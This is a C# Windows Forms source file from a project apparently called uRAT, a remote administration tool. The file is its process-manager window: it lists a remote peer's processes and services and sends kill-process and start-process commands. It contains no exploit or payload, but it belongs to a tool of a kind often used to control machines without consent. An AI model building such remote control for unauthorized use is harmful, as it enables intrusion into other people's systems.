using System;
using System.Drawing;
using System.Windows.Forms;
using uRAT.ManagersPlugin.ProcessManager.Operations;
using uRAT.ManagersPlugin.ProcessManager.Packets;
using uRAT.ManagersPlugin.Tools;
using uRAT.Server.Tools.Extensions;

namespace uRAT.ManagersPlugin.ProcessManager.Forms
{
    public partial class ProcessManagerForm : Form
    {
        private ProcessManagerOperation _op;
        

        public ProcessManagerForm(string peerName, ProcessManagerOperation operation)
        {
            InitializeComponent();
            Text = "Process manager - " + peerName;

            _op = operation;
            _op.OnPacketReceived += OperationPacketReceived;
            _op.SendPacket(new RefreshProcessesPacket());
            _op.SendPacket(new RefreshServicesPacket());
        }

        void OperationPacketReceived(object sender, uNet2.Packet.Events.OperationPacketEventArgs e)
        {
            if (e.Packet is ProcessInformationPacket)
            {
                var packet = e.Packet as ProcessInformationPacket;
                var lvItm = new ListViewItem(packet.ProcessName);
                lvItm.SubItems.Add(packet.Pid.ToString());
                lvItm.SubItems.Add(packet.WindowName);
                if (packet.IsThis)
                    lvItm.BackColor = Color.LightBlue;
                listView1.FlexibleInvoke(lv => lv.Items.Add(lvItm));
            }
            else if (e.Packet is ServiceInformationPacket)
            {
                var packet = e.Packet as ServiceInformationPacket;
                var lvItm = new ListViewItem(packet.Service);
                lvItm.SubItems.Add(packet.DisplayName);
                lvItm.SubItems.Add(packet.StartName);
                lvItm.SubItems.Add(packet.Description);
                listView2.FlexibleInvoke(lv => lv.Items.Add(lvItm));
            }
        }

        private void toolStripTextBox1_Click(object sender, EventArgs e)
        {

        }

        private void ProcessManagerFrm_Load(object sender, EventArgs e)
        {

        }

        private void ProcessManagerForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            _op.CloseOperation();
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            listView1.Items.Clear();
            _op.SendPacket(new RefreshProcessesPacket());
        }

        private void stopProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem lvItm in listView1.SelectedItems)
            {
                _op.SendPacket(new KillProcessPacket(Int32.Parse(lvItm.SubItems[1].Text)));
            }

            if (listView1.SelectedItems.Count > 0)
            {
                listView1.Items.Clear();
                _op.SendPacket(new RefreshProcessesPacket());
            }
        }

        private void startProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new StartProcessForm(_op).Show();
        }

        private void stopServiceToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }
    }
}
